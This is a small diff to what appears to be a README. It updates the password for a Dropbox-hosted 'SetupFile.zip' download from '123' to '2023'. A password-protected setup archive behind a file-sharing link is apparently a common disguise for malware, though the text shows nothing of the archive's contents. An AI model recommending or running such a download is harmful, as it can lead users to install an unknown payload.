@@ -11,7 +11,7 @@
 📁Download link: [DOWNLOAD](https://www.dropbox.com/scl/fi/aalg3rbfb0y7tudnl2fgh/SetupFile.zip?rlkey=474cn2uhu0dhqpclx2o25f96l&dl=0)
 
 
-🔓Password: 123
+🔓Password: 2023
 
 
 ## ❖ Content    
